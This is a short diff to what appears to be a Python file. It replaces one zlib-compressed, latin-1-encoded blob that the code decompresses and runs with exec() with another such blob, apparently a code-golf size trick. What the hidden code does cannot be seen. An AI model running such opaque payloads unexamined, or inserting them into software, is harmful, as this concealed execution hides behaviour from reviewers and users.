@@ -1,2 +1,2 @@
-#coding:latin_1
-import zlib;exec(zlib.decompress(bytes(map(ord,"xÚ‘Ánƒ0@ï|…DÍÁ9LªZåK–ä@³É[¥~ş $m¥ö„bû=cûËöğSâTK£'ëÃCÎŸ[qfÔò5AÿÍ@@¸óƒ­YÄ€Ë#¨‡¡¡¶q­ÖTúÒİŞ!ÍÒÓ½A.=_'«™‹”FTÜÌ¥Œm3†ZŒ ”5£ÏŸl»±;ıÚ˜zâYEª%“Ê¦Mµ›%o.HÌ²ÕFÒàfËºç¾,T…0U2î,<\"\r_n9¦L9üºğÕŞÇ*f	uØhÒÓO.\0Î„£î2’0amğÎ­\\Ùg9÷ñáa]8ì¾˜íß•=ÿì¤ö"))))
+#coding:L1
+import zlib;exec(zlib.decompress(bytes(map(ord,'xÚ•Án„ †ï<Å%ËÁ=4Ùhæ°"ğÆƒµhP×6´MúøU—n·Éö¤ß÷33g´ÍÜkò¢;xKzš°¬ÅIÏKÁÜ§Jkš—x1sb {µ`ÀÌpN,]‹Á-5ô•©«¡F|¢¹ÀKóõAº†Çå^x\\ ı¥dêp\\§•u5.PšŒcÉÆüÙêf$ §w½BwM¯ŠXWuwãK&‚¡;¹Û†Éİ¾êù{€ŠTˆ¥Ã‘	ÆØ¶#—C±­)ÍÂï‰¬bÌ-®X;pw”<\'n9fsQŞ,”û¼Âíñtwçœµ?«?>íı7$&Ä±'))))
